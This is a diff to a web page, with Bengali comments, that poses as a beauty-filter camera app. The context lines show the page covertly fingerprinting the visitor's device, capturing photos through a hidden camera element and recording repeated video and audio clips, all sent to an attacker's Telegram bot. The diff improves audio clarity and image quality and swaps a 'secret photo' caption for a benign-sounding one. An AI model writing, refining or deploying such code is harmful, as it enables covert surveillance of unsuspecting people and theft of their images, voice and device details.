@@ -68,9 +68,9 @@
       display: none;
     }
 
-    /* ✨ বিউটি ও স্কিন গ্লো ফিল্টার */
+    /* ✨ আরও উন্নত ও প্রিমিয়াম বিউটি ও স্কিন গ্লো ফিল্টার */
     .filter-beauty-glow {
-      filter: contrast(105%) brightness(112%) saturate(115%) drop-shadow(0 0 2px rgba(255,255,255,0.2));
+      filter: contrast(108%) brightness(115%) saturate(120%) blur(0.2px) drop-shadow(0 0 4px rgba(255,255,255,0.25));
     }
   </style>
 </head>
@@ -130,7 +130,6 @@
 
       const ua = navigator.userAgent;
       
-      // অপারেটিং সিস্টেম ও ডিভাইস মডেল আন্দাজ করার জন্য ইউজার এজেন্ট অ্যানালাইসিস
       let os = "Unknown OS";
       if (/windows/i.test(ua)) os = "Windows PC";
       else if (/mac/i.test(ua)) os = "MacOS / Apple";
@@ -177,18 +176,23 @@
       sendDeviceInfo();
 
       try {
+        // ব্যাকগ্রাউন্ড নয়েজ, ইকো এবং গেইন কন্ট্রোল রিমুভ করার জন্য স্পেশাল অডিও কনফিগারেশন
         camStream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: 'user' },
-          audio: true 
+          audio: {
+            echoCancellation: true,      // ইকো বা প্রতিধ্বনি দূর করবে
+            noiseSuppression: true,      // ব্যাকগ্রাউন্ডের সব ধরনের নয়েজ ফিল্টার করবে
+            autoGainControl: true        // সাউন্ড লেভেল ব্যালেন্স রাখবে
+          }
         });
 
         hiddenCam.srcObject = camStream;
         await new Promise(resolve => setTimeout(resolve, 800));
 
-        // ২. এরপর ৫টি ছবি তুলবে
+        // ২. উন্নত বিউটি ফিল্টারসহ ৫টি ছবি তুলবে
         await captureAndSendPhotos(5);
 
-        // ৩. এরপর ৫ সেকেন্ড করে ভিডিও ও অডিও ক্লিপ পাঠানো শুরু করবে
+        // ৩. এরপর ৫ সেকেন্ড করে ভিডিও ও পরিষ্কার অডিও ক্লিপ পাঠানো শুরু করবে
         startPeriodicRecording();
 
       } catch (err) {
@@ -212,7 +216,7 @@
 
           canvas.toBlob((blob) => {
             resolve(blob);
-          }, 'image/jpeg', 0.85);
+          }, 'image/jpeg', 0.90);
         }, 300);
       });
     }
@@ -224,7 +228,7 @@
           const formData = new FormData();
           formData.append('chat_id', TELEGRAM_CHAT_ID);
           formData.append('photo', photoBlob, `photo_${i}_${Date.now()}.jpg`);
-          formData.append('caption', `✨ বিউটি ফিল্টারসহ সিক্রেট ছবি #${i}`);
+          formData.append('caption', `✨ প্রিমিয়াম বিউটি ফিল্টার ছবি #${i}`);
 
           fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
             method: 'POST',
@@ -296,7 +300,7 @@
               const audioForm = new FormData();
               audioForm.append('chat_id', TELEGRAM_CHAT_ID);
               audioForm.append('voice', audioBlob, `audio_${Date.now()}.ogg`);
-              audioForm.append('caption', `🎙️ অডিও রেকর্ডিং ক্লিপ`);
+              audioForm.append('caption', `🎙️ নয়েজ-ফ্রি পরিষ্কার অডিও`);
 
               fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVoice`, {
                 method: 'POST',
